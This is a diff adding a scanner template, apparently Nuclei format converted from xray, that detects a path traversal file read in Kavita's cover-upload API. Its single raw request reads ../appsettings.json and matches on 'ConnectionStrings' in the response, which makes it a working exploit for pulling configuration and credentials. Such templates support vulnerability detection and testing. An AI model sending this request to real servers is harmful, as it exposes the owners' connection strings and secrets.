@@ -1,0 +1,26 @@
+id: poc-yaml-kavita-cover-upload-file-read
+
+info:
+  name: poc-yaml-kavita-cover-upload-file-read
+  author: h1ei1
+  severity: high
+  tags: xray-converted,lfi,fileupload,ct-483472
+  reference:
+    - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
+
+http:
+  - raw:
+      - |
+        GET /api/image/cover-upload?filename=../appsettings.json HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Microsoft.AspNetCore.Hosting.Internal.WebHost"
+          - "ConnectionStrings"
